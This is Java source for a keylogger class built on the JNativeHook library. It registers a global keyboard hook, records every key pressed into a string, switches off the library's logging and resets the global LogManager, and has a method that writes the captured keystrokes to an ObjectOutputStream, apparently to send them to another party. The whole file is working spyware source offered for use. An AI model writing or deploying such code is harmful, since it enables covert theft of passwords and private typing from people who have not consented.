package KeyLogger;

import java.io.IOException;
import java.io.ObjectOutputStream;
import java.util.logging.Level;
import java.util.logging.LogManager;
import java.util.logging.Logger;

import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;




public class KeyLogger implements NativeKeyListener {
	public String record = "";
	public ObjectOutputStream oos;
	
	public KeyLogger(ObjectOutputStream oos,String record) {
		// TODO Auto-generated constructor stub
		this.oos = oos;
		this.record = record;
	}

	public void nativeKeyPressed(NativeKeyEvent e) {
		record += NativeKeyEvent.getKeyText(e.getKeyCode());

		if (e.getKeyCode() == NativeKeyEvent.VC_ESCAPE) {
            		try {
                		GlobalScreen.unregisterNativeHook();
                		System.out.println(record);
            		} catch (NativeHookException nativeHookException) {
                		nativeHookException.printStackTrace();
            		}
        	}
	}

	public void nativeKeyReleased(NativeKeyEvent e) {
	//	System.out.println("Key Released: " + NativeKeyEvent.getKeyText(e.getKeyCode()));
	}

	public void nativeKeyTyped(NativeKeyEvent e) {
		//System.out.println("Key Typed: " + e.getKeyText(e.getKeyCode()));
	}

	public void get_Keylogger(ObjectOutputStream oos) {
		
		  LogManager.getLogManager().reset();
		  Logger logger = Logger.getLogger(GlobalScreen.class.getPackage().getName());

		  logger.setLevel(Level.OFF);

		try {
			GlobalScreen.registerNativeHook();
		}
		catch (NativeHookException ex) {
			System.err.println("There was a problem registering the native hook.");
			System.err.println(ex.getMessage());

			System.exit(1);
		}

		GlobalScreen.addNativeKeyListener(new KeyLogger(oos,record));
	}
	public void send_KeyLogger() throws IOException {
		oos.writeObject(this.record);
	}
	
}